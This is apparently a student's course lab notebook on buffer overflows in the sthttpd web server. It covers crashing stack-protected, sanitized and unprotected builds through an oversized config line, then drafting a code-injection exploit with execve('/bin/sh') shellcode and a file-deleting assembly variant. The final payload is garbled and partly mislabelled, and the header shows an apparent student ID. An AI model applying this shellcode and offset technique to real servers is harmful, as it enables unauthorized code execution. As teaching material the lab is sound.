@@ -1,0 +1,599 @@
+Jonathan Hui
+905-203-286
+CS33
+Eggert
+Winter 2020
+Smashing Lab Notebook
+
+=== 1-4 SETUP ===
+
+I ran:
+
+echo $PATH
+
+finding that /usr/local/cs/bin had already been prepended, and 
+
+which gcc
+
+outputted:
+
+/usr/local/cs/bin/gcc
+
+as expected.
+
+I downloaded the compressed sthttpd-2.27.0.tar.gz file and moved it onto the Linux servers.
+I then uncompressed it by running:
+
+tar -xvf sthttpd-2.27.0.tar.gz
+
+I then copied the .diff text from the spec into patch.diff locally, moving that only the servers
+to my lab directory. I ran:
+
+patch < patch.diff
+
+and specified the filenames as they were presented in the "---" rows; Even though it seems that the
+patches were done to a copy of the file, hence the "-delta" in the "+++" name, I went ahead and
+applied the changes directly to the files (manual editing of said files was the methodology mentioned
+in discussion section anyway, so it doesn't seem that creation of copies containing the changes is
+what is intended.
+
+I then ran:
+
+./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+followed by these sets of commands to compile the executable with different options, saving each
+version as specified in the project spec.
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+cd src
+mv thttpd thttpd-sp
+cd ..
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
+cd src
+mv thttpd thttpd-as
+cd ..
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+cd src
+mv thttpd thttpd-no
+cd ..
+
+Before running sthttpd, I went ahead to do the port calculation:
+port (12330 + 3 * (X % 293) + Y)
+X = student ID; Y = 1, 2, or 3 depending on sp, as, or no, respectively
+
+= 12330 + 3(3) + Y
+
+sp	Y = 1	port = 12340
+as	Y = 2	port = 12341
+no	Y = 3	port = 12342
+
+For each case, I ran the following under GDB:
+
+gdb ./thttpd-sp
+(gdb) run -p 12340 -D
+
+gdb ./thttpd-as
+(gdb) run -p 12341 -D
+
+gdb ./thttpd-no
+(gdb) run -p 12342 -D
+
+After these ran I created a file html.html locally, copying and pasting a basic html
+template. I moved this file to the current working directory of the HTTPD server(s).
+
+I ran this to ensure that the servers were working:
+
+curl http://localhost:12340/html.html
+curl http://localhost:12341/html.html
+curl http://localhost:12342/html.html
+
+All of these worked, printing out the same text that I had put into html.html! Yay!
+
+
+=== 5 Making sp Variant Crash ===
+
+I actually was able to make the as Variant crash before realizing how to crash the sp Variant.
+It seems that since adding 101 characters causes the program to exit, it doesn't actually detect
+the stack overflow. Thus, I must provide options that cause the program to attempt to return and
+check the "canary byte(s)" that are set due to stack protection and see that they were modified.
+
+After looking at the source code for thttpd.c in the provided github link, I found that options
+like "debug" and "chroot" were valid options that didn't require values/arguments, so I chose to
+use these so that I would avoid any error/exit thrown for not providing arguments. I first created
+a file config.txt that had the minimum number of copies of the word "chroot" over and over,
+delimited by spaces:
+
+chroot chroot chroot ...
+
+I then ran:
+
+gdb thttpd-sp
+(gdb) set disassemble-next-line on
+(gdb) run -p 12340 -D -C config.txt
+
+Unfortunately, this did not generate an error, and I then realized that maybe this wasn't enough
+overwrite anything that would make the stack protector angry due to padding or something. So, I
+incrementally added more "chroot " until I ran the above with an error, which only involved adding
+one more "chroot ".
+
+With 16 "chroot " arguments like this in the first line of config.txt:
+
+chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot
+
+I received:
+
+*** stack smashing detected ***: /w/home.24/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd-sp terminated
+[... a crude backtrace and memory map ...]
+Program received signal SIGABRT, Aborted.
+
+I then ran:
+
+(gdb) backtrace
+#0  0x00007ffff7604377 in raise () from /lib64/libc.so.6
+#1  0x00007ffff7605a68 in abort () from /lib64/libc.so.6
+#2  0x00007ffff7646ec7 in __libc_message () from /lib64/libc.so.6
+#3  0x00007ffff76e6567 in __fortify_fail () from /lib64/libc.so.6
+#4  0x00007ffff76e6522 in __stack_chk_fail () from /lib64/libc.so.6
+#5  0x0000000000404155 in read_config (filename=<optimized out>)
+    at thttpd.c:1129
+#6  0x00000000004044bd in parse_args (argc=argc@entry=6, argv=0x7fffffffe0c8)
+    at thttpd.c:893
+#7  0x0000000000402a06 in main (argc=6, argv=<optimized out>) at thttpd.c:380
+
+It is clear that in the line 1129, there was something that caused __stack_chk_fail to be run, so
+I reran the program but set:
+
+break 1129
+
+After running it again, this still didn't work and I still receive the error, so I set the
+break at 1128, which still gave me the error.
+
+I then resorted to looking at the "crude backtrace" I saw earlier:
+
+======= Backtrace: =========
+/lib64/libc.so.6(__fortify_fail+0x37)[0x7ffff76e6567]
+/lib64/libc.so.6(+0x118522)[0x7ffff76e6522]
+/w/home.24/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd-sp[0x404155]
+/w/home.24/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd-sp[0x4044bd]
+/w/home.24/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd-sp[0x402a06]
+/lib64/libc.so.6(__libc_start_main+0xf5)[0x7ffff75f0545]
+/w/home.24/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd-sp[0x403559]
+
+I saw that at address 0x404155, the crash happened, so I instead found out how to set breakpoints
+at memory addresses:
+
+[delete previous breakpoints]
+break *0x404155
+
+running this still gave me the crash, so I incrementally went back until I found that this allowed
+me to take things one step at a time:
+
+break *0x404150
+
+The instruction this rested on called <__stack_chk_fail@plt>. I realized that this instruction was
+associated with "line 1129" but wasn't actually a part of its operation, so I then went ahead and
+decided to set the breakpoint at the read_config function and just "ni" until I hit the error:
+
+[delete previous breakpoints]
+break read_config
+run -p 12340 -D -C config.txt
+ni
+ni
+...
+
+Eventuallly reaching the error, I saw this:
+
+1189        (void) fclose( fp );
+=> 0x0000000000404035 <read_config+1125>:       4c 89 ef        mov    %r13,%rdi
+   0x0000000000404038 <read_config+1128>:       e8 63 e3 ff ff  callq  0x4023a0 <fclose@plt>
+   0x000000000040403d <read_config+1133>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
+   0x0000000000404042 <read_config+1138>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+   0x000000000040404b <read_config+1147>:       0f 85 ff 00 00 00       jne    0x404150 <read_config+1408>
+   0x0000000000404051 <read_config+1153>:       48 83 c4 70     add    $0x70,%rsp
+
+As seen, the instruction jne 0x404150 clearly executed since that is where I was before! So, the
+instruction preceding this must have caused "jne" to exec, and "jne" executes if the "0 flag" is
+not set, so the previous instruction must have set a "nonzero" flag:
+
+64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+
+This must be an instruction that checks equality of a canary byte, xor-ing the value stored at
+%fs:0x28 with %rax and not setting the ZF flag to 0 (nonzero). Thus, jne sees this and executes,
+jumping to 0x404150:
+
+0x0000000000404150      1129                    hostname = e_strdup( value );
+   0x000000000040413c <read_config+1388>:       4c 89 f7        mov    %r14,%rdi
+   0x000000000040413f <read_config+1391>:       e8 3c fa ff ff  callq  0x403b80 <e_strdup>
+   0x0000000000404144 <read_config+1396>:       48 89 05 3d 2e 21 00    mov    %rax,0x212e3d(%rip)        # 0x616f88 <hostname>
+   0x000000000040414b <read_config+1403>:       e9 d5 fd ff ff  jmpq   0x403f25 <read_config+853>
+=> 0x0000000000404150 <read_config+1408>:       e8 bb e2 ff ff  callq  0x402410 <__stack_chk_fail@plt>
+   0x0000000000404155 <read_config+1413>:       0f 1f 00        nopl   (%rax)
+
+And this instruction is a call to __stack_chk_fail. So, the "1129" I saw earlier wasn't due to the
+code crashing "at" 1129, but that the call to that function was "embedded" in the section of
+machine code that 1129 was associated with, probably arbitrarily.
+
+
+=== 6 Making as Variant Crash ===
+
+After looking at the source code for thttpd.c in the provided github link, it appears that the
+line array is temporary storage buffer for the current line being read in from a config file.
+So, to make th as Variant crash, I want to have a line in a config file that is more than, as per
+the .diff file, 100 characters so that it will be overwritten, allowable by the fact that, in that
+same file, the while loop runs up 1000 times.
+
+As seen in the source code, I need to invoke the as Variant with the -C option followed by the
+filename of the config file. As such, I have created a file called config.txt that holds only 1
+line, but that line has 101 characters, counted by the column index from my text editor.
+
+After moving config.txt into the src/ folder, I ran:
+
+gdb thttpd-as
+(gdb) set disassemble-next-line on
+(gdb) run -p 12341 -D -C config.txt
+
+The program crashed with a stack-buffer-overflow error as expected:
+
+==28563==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcc44 at pc 0x00000043760b bp 0x7fffffffcb90 sp 0x7fffffffc340
+WRITE of size 101 at 0x7fffffffcc44 thread T0
+    #0 0x43760a in __interceptor_fgets ../../../../gcc-9.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1200
+    #1 0x52b46e in read_config /u/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd.c:1015
+    #2 0x52bf63 in parse_args /u/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd.c:893
+    #3 0x40724c in main /u/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd.c:380
+    #4 0x7ffff6cb8544 in __libc_start_main ../csu/libc-start.c:266
+    #5 0x408479  (/w/home.24/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd-as+0x408479)
+
+Address 0x7fffffffcc44 is located in stack of thread T0 at offset 148 in frame
+    #0 0x52b3cf in read_config /u/ch/ugrad/huij/CS33/smashing/sthttpd-2.27.0/src/thttpd.c:1000
+
+  This frame has 1 object(s):
+    [48, 148) 'line' (line 1002) <== Memory access at offset 148 overflows this variable
+
+
+I then ran:
+
+(gdb) backtrace
+
+which then told me that there was "No stack." I did a bit of online reading into this message, and
+it appears that either either the program didn't even start, or gdb doesn't recognize the stack
+anymore. I would assume that it's the latter, since the program clearly was able to run and read
+in data until the overflow occurred.
+
+I set breakpoint at line 1015, which is where the overflow occured and looking at the machine code,
+saw that :
+
+callq <__interceptor_fgets(char*, SIZE_T, void*)> crashed the program, which makes sense because
+this line reads in data into line[] and subsequently overfills it.
+
+So, I stepped into that instruction to try and discover the machine instruction that was executed
+in this function:
+
+break 1015
+run -p 12341 -D -C config.txt
+ni
+ni
+ni
+si
+ni
+...
+
+Eventually:
+
+33      in ../../../../gcc-9.2.0/libsanitizer/asan/asan_interceptors_memintrinsics.h
+=> 0x0000000000437538 <__interceptor_fgets(char*, SIZE_T, void*)+200>:  48 83 fb 40     cmp    $0x40,%rbx
+   0x000000000043753c <__interceptor_fgets(char*, SIZE_T, void*)+204>:  0f 87 7e 00 00 00       ja     0x4375c0 <__interceptor_fgets(char*, SIZE_T, void*)+336>
+(gdb)
+0x000000000043753c      33      in ../../../../gcc-9.2.0/libsanitizer/asan/asan_interceptors_memintrinsics.h
+   0x0000000000437538 <__interceptor_fgets(char*, SIZE_T, void*)+200>:  48 83 fb 40     cmp    $0x40,%rbx
+=> 0x000000000043753c <__interceptor_fgets(char*, SIZE_T, void*)+204>:  0f 87 7e 00 00 00       ja     0x4375c0 <__interceptor_fgets(char*, SIZE_T, void*)+336>
+
+then:
+
+(gdb)
+0x00000000004375c0 in __interceptor_fgets (
+    s=0x7fffffffcbe0 "chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot chroot", size=<optimized out>, file=<optimized out>)
+    at ../../../../gcc-9.2.0/libsanitizer/asan/asan_mapping.h:401
+401     ../../../../gcc-9.2.0/libsanitizer/asan/asan_mapping.h: No such file or directory.
+   0x00000000004375b3 <__interceptor_fgets(char*, SIZE_T, void*)+323>:  83 e0 07        and    $0x7,%eax
+   0x00000000004375b6 <__interceptor_fgets(char*, SIZE_T, void*)+326>:  39 d0   cmp    %edx,%eax
+   0x00000000004375b8 <__interceptor_fgets(char*, SIZE_T, void*)+328>:  0f 8c 3f ff ff ff       jl     0x4374fd <__interceptor_fgets(char*, SIZE_T, void*)+141>
+   0x00000000004375be <__interceptor_fgets(char*, SIZE_T, void*)+334>:  66 90   xchg   %ax,%ax
+=> 0x00000000004375c0 <__interceptor_fgets(char*, SIZE_T, void*)+336>:  48 89 de        mov    %rbx,%rsi
+   0x00000000004375c3 <__interceptor_fgets(char*, SIZE_T, void*)+339>:  4c 89 e7        mov    %r12,%rdi
+   0x00000000004375c6 <__interceptor_fgets(char*, SIZE_T, void*)+342>:  e8 a5 ac 0b 00  callq  0x4f2270 <__asan_region_is_poisoned(__sanitizer::uptr, __sanitizer::uptr)>
+   0x00000000004375cb <__interceptor_fgets(char*, SIZE_T, void*)+347>:  49 89 c7        mov    %rax,%r15
+   0x00000000004375ce <__interceptor_fgets(char*, SIZE_T, void*)+350>:  48 85 c0        test   %rax,%rax
+   0x00000000004375d1 <__interceptor_fgets(char*, SIZE_T, void*)+353>:  0f 84 4c ff ff ff       je     0x437523 <__interceptor_fgets(char*, SIZE_T, void*)+179>
+
+So it seems that the cmp instruction:
+
+48 83 fb 40     cmp    $0x40,%rbx
+
+causes flags to be set in such a way that the program ends up calling that ends up calling
+<__asan_region_is_poisoned...>, which sounds like something that would only be called if there
+was some memory corruption. Also, I note that there are two mov instructions that move registers
+into rdi and rsi, which are argument registers, so I am inclined to think that this is in preparation
+to exit, since it is effectively "repacking" the arguments.
+
+// As a sidenote, I did notice this 
+
+0x00007ffff6e05730 in __strlen_sse2_pminub () from /lib64/libc.so.6
+=> 0x00007ffff6e05730 <__strlen_sse2_pminub+192>:       66 0f d7 d1     pmovmskb %xmm1,%edx
+(gdb)
+0x00007ffff6e05734 in __strlen_sse2_pminub () from /lib64/libc.so.6
+=> 0x00007ffff6e05734 <__strlen_sse2_pminub+196>:       85 d2   test   %edx,%edx
+(gdb)
+0x00007ffff6e05736 in __strlen_sse2_pminub () from /lib64/libc.so.6
+=> 0x00007ffff6e05736 <__strlen_sse2_pminub+198>:       0f 85 c4 01 00 00       jne    0x7ffff6e05900 <__strlen_sse2_pminub+656>
+
+which seems to be some function that checks string length. I am not sure if these instructions here
+might actually be the ones that "find out" that the input string is longer than 100 characters,
+but in any case the machine code mentioned above seems to be the one that causes the first real
+'error', per se.
+
+
+=== 7 Making no Variant Crash ===
+
+As an easy cop-out solution, I just added a bunch more "chroot " instances to the same config file
+as I used in #5, which caused a segfault as expected, also at line 1189 as expected, since this
+would mean the return address was corrupted:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000403f69 in read_config (filename=<optimized out>) at thttpd.c:1189
+1189        (void) fclose( fp );
+   0x0000000000403f55 <read_config+1109>:       4c 89 ef        mov    %r13,%rdi
+   0x0000000000403f58 <read_config+1112>:       e8 d3 e3 ff ff  callq  0x402330 <fclose@plt>
+   0x0000000000403f5d <read_config+1117>:       48 83 c4 70     add    $0x70,%rsp
+   0x0000000000403f61 <read_config+1121>:       5b      pop    %rbx
+   0x0000000000403f62 <read_config+1122>:       5d      pop    %rbp
+   0x0000000000403f63 <read_config+1123>:       41 5c   pop    %r12
+   0x0000000000403f65 <read_config+1125>:       41 5d   pop    %r13
+   0x0000000000403f67 <read_config+1127>:       41 5e   pop    %r14
+=> 0x0000000000403f69 <read_config+1129>:       c3      retq
+
+I ran:
+
+(gdb) bt
+#0  0x0000000000403f69 in read_config (filename=<optimized out>) at thttpd.c:1189
+#1  0x746f6f7268630074 in ?? ()
+#2  0x00746f6f72686300 in ?? ()
+#3  0x6300746f6f726863 in ?? ()
+...
+
+where '...' denotes 43 more lines of " in ?? () "
+
+I then did:
+
+break 1189
+set disassemble-next-line on
+run -p 12342 -D -C config.txt
+
+The first time with this breakpoint, I just spammed "ni" until I saw that it was a retq that caused
+the program to crash, so I ran it again and when %rip rested on the retq, I did:
+
+(gdb) ni
+   0x0000000000403f55 <read_config+1109>:       4c 89 ef        mov    %r13,%rdi
+   0x0000000000403f58 <read_config+1112>:       e8 d3 e3 ff ff  callq  0x402330 <fclose@plt>
+   0x0000000000403f5d <read_config+1117>:       48 83 c4 70     add    $0x70,%rsp
+   0x0000000000403f61 <read_config+1121>:       5b      pop    %rbx
+   0x0000000000403f62 <read_config+1122>:       5d      pop    %rbp
+   0x0000000000403f63 <read_config+1123>:       41 5c   pop    %r12
+   0x0000000000403f65 <read_config+1125>:       41 5d   pop    %r13
+   0x0000000000403f67 <read_config+1127>:       41 5e   pop    %r14
+=> 0x0000000000403f69 <read_config+1129>:       c3      retq
+(gdb) p/x $rsp
+$1 = 0x7fffffffce48
+(gdb) x $rsp
+0x7fffffffce48: 0x68630074
+(gdb) x 0x68630074
+0x68630074:     Cannot access memory at address 0x68630074
+(gdb) x 0x7fffffffce48
+
+Clearly, the return address that %rsp holds isn't accessible, so that must cause the segfault!
+
+To verify this was the case, I went ahead and ran this exact same code with a different config
+file with valid input, and:
+
+(gdb) p/x $rsp
+$2 = 0x7fffffffce48
+(gdb) x $rsp
+0x7fffffffce48: 0x004043cd
+(gdb) x 0x004043cd
+0x4043cd <parse_args+605>:      0xfffeeee9
+
+So yes, that 504-character "chroot " spam clearly corrupted the return.
+
+
+=== 8 Generating Assembly Language Code ===
+
+I navigated to the parent directory of src/ and ran the following sets of commands, each of which:
+1) Cleans make's previous output files
+2) Executes the makefile with the -O2 and -f options from before, but with -S appended in order
+   to stop at generation of assembly language code in the .o output file
+3) Change directory into the src/ folder, then rename the .o to the specified filename in the spec
+4) Change directory back to the parent in order to be able to repeat these steps
+
+make clean
+make CFLAGS='-O2 -fno-inline -fstack-protector-strong -S'
+cd src
+mv thttpd.o thttpd-sp.s
+cd ..
+
+make clean
+make CFLAGS='-O2 -fno-inline -fsanitize=address -S'
+cd src
+mv thttpd.o thttpd-sp.s
+cd ..
+
+make clean
+make CFLAGS='-O2 -fno-inline -fno-stack-protector -S'
+cd src
+mv thttpd.o thttpd-sp.s
+
+In inspecting the way handle_read is implemented, it's immediately obvious that the NO variant's
+is the shortest, which makes sense because it doesn't perform a lot of checks. 
+
+As expected, the AS variant has a bunch of these:
+
+cmpb	$0, 2147450880(%rax)
+jne	.L#####
+
+It seems that 2147450880 plus the value in memory pointed to by %rax is supposed to be 0, maybe
+as some sort of table keeping track of where memory has been allocated. If for some reason the
+cmpq instruction doesn't see a 0, then it has been "used" or something, and that would throw an
+error.
+
+The SP variant is actually relatively short, especially compared to AS. I searched for "fs:"
+because that was the instruction that I had found in crashing the SP variant, but nothing
+exists *inside* handle_read. However, these do appear around the file:
+
+	movq	%fs:40, %rax
+	movq	%rax, 40(%rsp)
+
+.L372:
+	call	__stack_chk_fail
+	.cfi_endproc
+	
+So, I would assume that there are some external functions that handle_read calls that do "pass
+through these instructions and thus allow it to have the stack checked for overflow.
+
+
+=== 9 Building an Exploit ===
+
+Based on everything done in this lab so far, whatever we "inject" must be done in a file that is
+supposed to be a config file. On inspection, there do not appear to be any functions inside thttpd
+that can perform this task for us, so simply setting the return address to something "internal"
+isn't going to work.
+
+Based on reading one of the linked articles in the spec:
+http://crypto.stanford.edu/~blynn/rop/
+
+It appears that the general idea should be to send in instructions in the buffer itself, then set
+the return address to those instructions in the buffer so that they will be executed, ideally
+while saving the actual return address so that the program can continue as if nothing happens.
+
+As such, the NO variant will be used, since it has no stack protection and no NX bit (which would
+normally stop instructions from being executed on the stack).
+
+As previously, done, we want the program to return normally, so everything inside config must be
+valid input. In addition, we should perfectly overwrite the return address, so in anticipation
+of what's to be done, if the return address was at offset 10 from the buffer, then this would not
+work:
+
+chroot chADDRESS
+
+Since "dchADDRESS" isn't a valid input, the program will exit on its own: thus, we need some input
+that allows us to have "custom input" --> use an input that "takes a value", say, "dir". In reading
+the source code of thttpd a little more, it seems that the argument that is passed into options
+is separated by an equal sign. Thus, the exploit config file must take on this form:
+
+dir=[...]ADDRESS
+
+I copied the shellcode from the site linked earlier and similarly put it following "dir=". To find
+the buffer location in memory, I did not edit the source code like they did in the link but instead
+ran the program validly under GDB, breaking at the beginning of the function:
+
+(gdb) break read_config
+(gdb) run -p 12342 -D -C config_valid.txt
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffce30:
+ rip = 0x403b00 in read_config (thttpd.c:1008); saved rip = 0x4043cd
+ called by frame at 0x7fffffffce70
+ source language c.
+ Arglist at 0x7fffffffce20, args: filename=0x7fffffffe416 "config_exploit.txt"
+ Locals at 0x7fffffffce20, Previous frame's sp is 0x7fffffffce30
+ Saved registers:
+  rip at 0x7fffffffce28
+  
+This last memory address is apparently where the return address is stored. To find where this is
+in relation to the buffer, I ran:
+
+gdb thttpd-no
+(gdb) break read_config
+(gdb) layout regs
+(gdb) run -p 12342 -D -C config_valid.txt
+Breakpoint 1, read_config (filename=0x7fffffffe419 "config_valid.txt") at thttpd.c:1008
+1008        fp = fopen( filename, "r" );
+(gdb) print line
+$6 = '\000' <repeats 99 times>
+(gdb) x line
+0x7fffffffcd90: 0 '\000'
+(gdb) print &line
+$7 = (char (*)[100]) 0x7fffffffcd90
+(gdb) step
+1009        if ( fp == (FILE*) 0 )
+(gdb) print line
+$8 = '\000' <repeats 99 times>
+(gdb) x line
+0x7fffffffcd90: 0 '\000'
+(gdb) print &line
+$9 = (char (*)[100]) 0x7fffffffcd90
+(gdb) step
+1015        while ( fgets( line, 1000, fp ) != (char*) 0 )
+(gdb) print line
+$10 = '\000' <repeats 99 times>
+(gdb) x line
+0x7fffffffcd90: 0 '\000'
+(gdb) print &line
+$11 = (char (*)[100]) 0x7fffffffcd90
+(gdb) step
+1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+(gdb) print line
+$12 = "debug", '\000' <repeats 94 times>
+(gdb) x line
+0x7fffffffcd90: 100 'd'
+(gdb) print &line
+$13 = (char (*)[100]) 0x7fffffffcd90
+
+It is clear that the memory address of the buffer is 0x7fffffffcd90. Taking the DIFFERENCE OF THESE
+two values:
+
+0x7fffffffce28 - 0x7fffffffcd90 = 152 
+
+so the location of the return address is 152 bytes after the start of the input buffer.
+
+"0x7fffffffcd90" will be where we want to return to, PLUS 4 because the start of the commands is
+4 characters from the start of the buffer: "dir=". Thus, we actually want to return to the address
+
+0x7fffffffcd94
+
+In little-endian: 94cdffffff7f
+
+In the end, I was able to come up with this:
+
+dir=eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800efbead00000000000000000000000000000000000000000000000000000000000000000000000000000000000ο󿀀
+
+Where, if the string between dir= and the 0's was valid hex rather than requiring to convert from
+ASCII to hex, it would work and exec /bin/sh and you'd be able to run rm victim.txt easily.
+
+The above sets the return aaddress to the address of "e" in the part following dir=, so if that
+section was literal hex rather than converted-from-ascii-hex, this would work. Unfortunately, all
+text editors use UTF-8 and I am not able to use an online ASCII converted to correctly translate
+between the two encodings/formats to do so.
+
+In addition, if instead the program was:
+
+int main() {
+  asm("\
+needle0: jmp there\n\
+here:    pop %rdi\n\
+         xor %rax, %rax\n\
+         movb $0x3b, %al\n\
+         xor %rsi, %rsi\n\
+         xor %rdx, %rdx\n\
+         syscall\n\
+there:   call here\n\
+.string \"/usr/local/cs/bin/rm victim.txt\"\n\
+needle1: .octa 0xdeadbeef\n\
+  ");
+}
+
+and this was objdump-ed instead of the shell-exec version, in theory that will directly remove the
+file.
+
+However, running my solution will effectively use buffer overflow to employ ROP.
